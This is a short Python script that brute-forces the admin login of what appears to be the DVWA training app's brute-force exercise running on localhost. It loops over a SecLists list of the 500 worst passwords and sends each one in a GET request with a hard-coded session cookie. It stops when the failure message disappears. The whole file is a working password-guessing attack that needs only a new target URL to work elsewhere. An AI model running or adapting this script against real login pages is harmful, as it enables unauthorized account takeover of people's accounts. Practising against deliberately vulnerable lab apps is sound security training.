import requests
import sys

COOKIE="security=medium; PHPSESSID=n6ocn51o180chaj42skaa5q454"
LOGIN_FAILED_STR="password incorrect"
PASSLIST = "C:/data/project/SecLists/Passwords/500-worst-passwords.txt"
USER = "admin"


with open(PASSLIST) as file:
    pass_list = file.readlines() 

for pwd in pass_list:
    pwd = pwd.strip("\n")
    URL=f"http://localhost:8000/vulnerabilities/brute/?username={USER}&password={pwd}&Login=Login#"
    response = requests.get(url=URL, headers={"Cookie":COOKIE})
    if response.text.find(LOGIN_FAILED_STR)<0:
        print(f"LOGIN FOUND: {USER}/{pwd}")
        sys.exit(0)
    else:
        print(f"LOGIN FAILED: {USER}/{pwd}")
